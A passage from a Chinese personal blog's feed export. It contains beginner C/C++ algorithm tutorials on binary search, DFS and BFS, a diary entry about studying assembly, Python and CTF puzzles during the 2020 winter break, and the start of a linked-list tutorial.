    <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原来啊，把数字转换成字符串的形式，这样的话，就很容易了；</p><p>学会了吗，去练习一下吧：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1002" target="_blank" rel="noopener">杭电1002</a></p><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><p>这个算法是过双创中心面试之后第一个讲解的算法，其实现在还是懵懵的；</p><p>二分查找法，其实是一种有序的查找方法，也称折半查找，如果是无序的则要先进行排序操作；</p><p>基本思想是：目标值通过与中间元素比较，可分为三种情况：</p><p>1、目标值与中间元素相等，查找结束；</p><p>2、目标值比中间元素大，则把后半部分的中间元素与目标值比较；</p><p>3、目标值比中间元素小，则把前半部分的中间元素与目标值比较；</p><p>这三步一直循环，直到找到答案为止；</p><p>适用情况：求最大值中的最小值、求最小值中的最大值；（听着很别扭，其实就是这样）</p><p>类似于数学里面的二分，思想差不多；</p><p>以一道题来举例：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=4004" target="_blank" rel="noopener">杭电4004</a></p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">500200</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> L<span class="token punctuation">,</span>n<span class="token punctuation">,</span>m<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//二分函数</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>cnt<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">></span>x<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>t<span class="token operator">></span>x<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            cnt<span class="token operator">++</span><span class="token punctuation">;</span>            t<span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cnt<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;=</span>m<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> mid<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>L<span class="token operator">>></span>n<span class="token operator">>></span>m<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token operator">++</span>n<span class="token punctuation">]</span><span class="token operator">=</span>L<span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>a<span class="token operator">+</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> l<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>r<span class="token operator">=</span>L<span class="token punctuation">,</span>res<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;=</span>r<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//这里的小于等于千万不能忘记等于</span>        <span class="token punctuation">{</span>            mid<span class="token operator">=</span><span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//分半</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//取左</span>            <span class="token punctuation">{</span>                res<span class="token operator">=</span>mid<span class="token punctuation">;</span>                r<span class="token operator">=</span>mid<span class="token number">-1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token comment" spellcheck="true">//取右</span>            <span class="token punctuation">{</span>                l<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题是不是太难了呀，不要紧，在给你一道简单的：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=2199" target="_blank" rel="noopener">杭电2199</a></p><p>这题算是很简单的二分了，要是不会的话，回来看代码：</p><p>注意啊，这段代码里面的cin和cout要改成C语言的scanf和printf，不知为什么cin和cout过不去，可能因为保留的</p><p>小数位数吧，就很离谱；</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iomanip></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">double</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token operator">+</span><span class="token number">7</span><span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token operator">+</span><span class="token number">3</span><span class="token operator">*</span>x<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> t<span class="token punctuation">;</span>    <span class="token keyword">double</span> l<span class="token punctuation">,</span>r<span class="token punctuation">,</span>m<span class="token punctuation">,</span>n<span class="token punctuation">,</span>mid<span class="token punctuation">;</span>    cin <span class="token operator">>></span> t<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cin <span class="token operator">>></span> m<span class="token punctuation">;</span>        l<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>r<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">></span>m<span class="token operator">||</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>m<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"No solution!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l <span class="token operator">></span> <span class="token number">0.000001</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                   mid <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">-</span>m<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                       r <span class="token operator">=</span> mid<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                 <span class="token punctuation">{</span>                    l <span class="token operator">=</span> mid<span class="token punctuation">;</span>                <span class="token punctuation">}</span>             <span class="token punctuation">}</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token function">setprecision</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> r <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Dfs-amp-Bfs"><a href="#Dfs-amp-Bfs" class="headerlink" title="Dfs &amp; Bfs"></a>Dfs &amp; Bfs</h3><p>相信打过acm比赛的人都知道这两种算法，一种叫做dfs（深度优先搜索），一种叫做bfs（广度优先搜索）；</p><p>怎么说呢，折两种算法早就想学了，就是没找到机会，现在正好学习算法，就简单学学吧；</p><h4 id="Dfs"><a href="#Dfs" class="headerlink" title="Dfs"></a>Dfs</h4><p>深度优先搜索算法（Depth First Search，简称DFS）：一种用于遍历或搜索树或图的算法。 沿着树的深度遍历树</p><p>的节点，尽可能深的搜索树的分支，当节点v的所在边都己被探寻过或者在搜寻时结点不满足条件，搜索将回溯到</p><p>发现节点v的那条边的起始节点，整个进程反复进行直到所有节点都被访问为止；</p><h5 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">check</span><span class="token punctuation">(</span>参数<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>满足条件<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> step<span class="token punctuation">)</span><span class="token punctuation">{</span>        判断边界        <span class="token punctuation">{</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>操作        <span class="token punctuation">}</span>        尝试每一种可能        <span class="token punctuation">{</span>               满足check条件               标记               继续下一步<span class="token function">dfs</span><span class="token punctuation">(</span>step<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>               恢复初始状态（回溯的时候要用到）        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>模板也是根据实际情况来改，下面通过一个实例来了解一下：</p><h5 id="全排列问题"><a href="#全排列问题" class="headerlink" title="全排列问题"></a>全排列问题</h5><p>问题描述：1~n , n个数字，能组成多少个不同的数字？</p><p>例如：n=3，则能组成的数字有：123 , 132 , 213 , 231 , 312 , 321</p><h5 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h5><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span> </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> book<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span>num<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> step<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>step <span class="token operator">==</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断边界</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            cout <span class="token operator">&lt;&lt;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>num<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//遍历</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>book<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//满足check</span>        <span class="token punctuation">{</span>            a<span class="token punctuation">[</span>step<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>            book<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//标记</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>step <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//继续搜索</span>            book<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//恢复初始状态</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> num<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//从第一个开始</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"共有"</span> <span class="token operator">&lt;&lt;</span> num<span class="token operator">/</span>n <span class="token operator">&lt;&lt;</span> <span class="token string">"个"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Bfs"><a href="#Bfs" class="headerlink" title="Bfs"></a>Bfs</h4><p>广度优先算法（Breadth-First-Search，简称BFS），是一种图形搜索演算法。简单的说，BFS是从根节点开始，沿</p><p>着树的宽度遍历树的节点，如果发现目标，则演算终止；</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2月29日的深更半夜</title>
      <link href="/2020/02/29/2-yue-29-ri/"/>
      <url>/2020/02/29/2-yue-29-ri/</url>
      
        <content type="html"><![CDATA[<p>这篇博客呢就闲聊一点吧，反正今天也是一个特殊的日子；</p><a id="more"></a><p>​        寒假到今天为止50天了，因为疫情原因，大把好时光就这么浪费了，真是难过又觉得可惜，先自我作个总结吧：</p><p>​        从寒假第一天开始，玩了一个多星期的王者荣耀（自己很不务正业），想着自己还有任务，赶紧学习，还来得及其实，但是吧，我这人，虽说自觉性很高，但是吧，想耐住性子学习还真不容易；</p><p>​        况且，我们任务学习汇编和PHP。这种底层语言真的是很无聊，学着就想吐；刚开始接触PHP的时候感觉很好玩，但是学了一段时间，发现，它的语法还有格式对我这种强迫症来讲，算了算了吧，实在是驾驭不了；</p><p>​        我就重点学习汇编，汇编说实话，更麻烦，枯燥无味，很繁琐，可能受C，C++的影响，底层语言真的是无话可说，顿时感觉高级语言好玩；</p><p>​        讲真的，想过放弃，但是某一天，堆堆给了我XCTF的链接，我一进去，哇塞，好酷的页面，瞬间又有了学习的动力，我就注册账号，发现题目不是想象的那样，太难了；但是没关系，谁能一开始就觉得简单呢，我就边玩边学，耐得住性子，坐在写字桌前面看书看视频，开头难但是还得学好。。。</p><p>​        第一次做出来一道CTF的题目的时候，我那心情，别提有多高兴，题目考验的不仅仅是思维能力，还有计算能力，使用工具的能力，印象最深的是一道P二维码的题目，为了做它，新学了一点PS基础，P了一个晚上还没出来，心态没了；</p><p>​        再后来，老师收集学习进度说还得整blog（一提到blog我就来气），看着教程做都做不出来，多亏了柠檬大佬，才有了今天在这里写似日记非日记的东西（嘻嘻嘻）；</p><p>​        最近，又得学习Python，还得装虚拟机，虚拟机更是麻烦，所有的错误情况我都遇见了估计，没有比我还倒霉的啦，现在还没装，没心情了，想着尽快把Python基础学完才行，才能进行下一个学习计划；</p><p>、</p><p>、</p><p>、</p><p>长路漫漫，为了拿offer，为了将来，加油干<del>~</del></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NUL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链表—Link List</title>
      <link href="/2020/02/18/lian-biao/"/>
      <url>/2020/02/18/lian-biao/</url>
      
        <content type="html"><![CDATA[<p>链表是C语言中非常难理解的一个知识点，可以说是比指针还难学的东西。在学习数据结构的时候常常会用到，所</p><p>以想来想去有必要整理一波；</p><a id="more"></a><p>链表种类很多种，有单向链表，双向链表，空头链表，非空头链表，循环链表，非循环链表；</p><p>这里我只学了单向空头和单向非空头链表，先整理这两种，以后学完再添加；</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>链表实际上是线性表的链式存储结构，与数组不同的是，它是用一组任意的存储单元来存储线性表中的数据，存储</p><p>单元不一定是连续的；</p><p>且链表的长度不是固定的，链表数据的这一特点使其可以非常的方便地实现节点的插入和删除操作；</p><p>链表的每个元素称为一个节点，每个节点都可以存储在内存中的不同的位置，为了表示每个元素与后继元素的逻辑</p><p>关系，以便构成“一个节点链着一个节点”的链式存储结构；</p><p>除了存储元素本身的信息外，还要存储其直接后继信息，因此，每个节点都包含两个部分，第一部分称为链表的数</p><p>据区域，用于存储元素本身的数据信息，第二部分是一个结构体指针，称为链表的指针域，用于存储其直接后继的</p><p>节点信息；</p><p>next的值实际上就是下一个节点的地址，当前节点为末节点时，next的值设为空指针；</p><h4 id="优点（相对于数组）"><a href="#优点（相对于数组）" class="headerlink" title="优点（相对于数组）"></a>优点（相对于数组）</h4><p>对线性表进行删除，添加等操作时候，不需要移动大量数据，操作简便，而数组需要动用大量数据，十分困难；同</p><p>时链表属于动态分配内存，数据量可以改变，而数组长度必须提前定义好，属于静态分配内存；链表省空间，数组</p><p>容易越界，长度过长又会造成系统资源浪费；</p><p>总的来说，链表优点非常多；</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>单向链表只能顺序访问，不能随机访问，这种储存结构最大缺点就是容易断链；一旦某个节点指针域数据丢失，将</p><p>无法找到下一个节点，也就是说，该节点的后面的数据全部丢失；</p><h3 id="无空头链表"><a href="#无空头链表" class="headerlink" title="无空头链表"></a>无空头链表</h3><h4 id="头文件-函数声明-结构体-全局变量"><a href="#头文件-函数声明-结构体-全局变量" class="headerlink" title="头文件+函数声明+结构体+全局变量"></a>头文件+函数声明+结构体+全局变量</h4><p>头文件stdlib.h，调用malloc（）函数和free（）函数；</p><p>函数比较多，先声明一下，便于阅读；</p><p>结构体先设一个成员，根据自己情况来设；</p><p>设全局变量的话，写各个操作函数的时候就省了一个形参；</p><h5 id="头文件（根据使用的语言自行修改）"><a href="#头文件（根据使用的语言自行修改）" class="headerlink" title="头文件（根据使用的语言自行修改）"></a>头文件（根据使用的语言自行修改）</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">//函数声明 链表的增、删、查、改；</span><span class="token keyword">void</span> <span class="token function">AddTail</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//创建链表，在链表中增加一个数据，尾添加</span><span class="token keyword">void</span> <span class="token function">AddHead</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//创建链表，在链表中增加一个数据，头添加</span><span class="token keyword">void</span> <span class="token function">AddList</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//在数字index后面添加数字a</span><span class="token keyword">void</span> <span class="token function">DeleteHead</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//头删除</span><span class="token keyword">void</span> <span class="token function">DeleteTail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//尾删除</span><span class="token keyword">void</span> <span class="token function">DeleteNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//删除指定节点 </span><span class="token keyword">void</span> <span class="token function">SeekList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//遍历链表——>查</span><span class="token keyword">void</span> <span class="token function">ChangeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将index改为 n  </span><span class="token keyword">void</span> <span class="token function">FreeList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//链表清空</span><span class="token keyword">struct</span> Node<span class="token operator">*</span> <span class="token function">SearchNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查询指定节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">//节点结构体</span><span class="token keyword">struct</span> Node<span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">;</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//指向下一个节点的指针</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">//链表头尾指针（全局变量）</span><span class="token keyword">struct</span> Node<span class="token operator">*</span> head <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">struct</span> Node<span class="token operator">*</span> tail <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h4><h5 id="头添加"><a href="#头添加" class="headerlink" title="头添加"></a>头添加</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">AddHead</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//创建链表，在链表中增加一个数据，头添加</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//创建一个节点</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> Node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 